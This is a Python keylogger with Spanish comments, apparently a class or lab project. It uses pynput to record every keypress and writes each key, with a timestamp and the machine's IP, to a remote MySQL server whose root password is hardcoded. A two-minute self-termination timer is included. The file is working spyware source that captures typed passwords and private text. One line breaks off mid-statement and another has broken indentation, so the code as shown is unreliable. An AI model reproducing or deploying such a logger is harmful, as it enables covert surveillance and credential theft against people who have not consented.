from pynput.keyboard import Listener, Key
from datetime import datetime, timedelta
import socket
import mysql.connector

# Tiempo de vida del keylogger (2 minutos)
TIEMPO_DE_VIDA_MINUTOS = 2
muerte_keylogger = datetime.now() + timedelta(minutes=TIEMPO_DE_VIDA_MINUTOS)

# Función para obtener la IP del cliente
def obtener_ip_cliente():
    try:
        hostname = socket.gethostname()
        ip_cliente = socket.gethostbyname(socket.gethostname())
        return ip_cliente
    except Exception:
        return "IP_DESCONOCIDA"

# Función para guardar en la base de datos
def guardar_en_bd(mensaje):
    try:
        conexion = mysql.connector.connect(
            host="192.168.1.59",
            user="root",
            password="proyectose@",
            database="bd_keyloggers"
        )
        cursor = conexion.cursor()

        # Obtener la fecha, IP y formatear el mensaje
fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_cliente = obtener_ip_cliente()

        # Insertar en la base de datos con el orden correcto
        cursor.execute("INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, %s)", (fecha, ip_cliente, mensa>

        conexion.commit()
        conexion.close()
    except mysql.connector.Error as error:
        print(f"Error al guardar en la base de datos: {error}")

# Función que maneja las pulsaciones de teclas
def evento_teclado_bb(key):
    try:
        # Verifica si ha pasado el tiempo de vida
        if datetime.now() >= muerte_keylogger:
            print("\nEl tiempo de vida del keylogger ha terminado. Cerrando...")
            return False  # Detiene el listener

        # Manejo de teclas normales y especiales
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = str(key)  # Para teclas como Shift, Enter, etc.

        # Guardar en la base de datos
        guardar_en_bd(key_str)
    except Exception as error:
        print(f"Error al procesar la tecla: {error}")

# Escuchar las teclas presionadas
with Listener(on_press=evento_teclado_bb) as listener:
    listener.join()






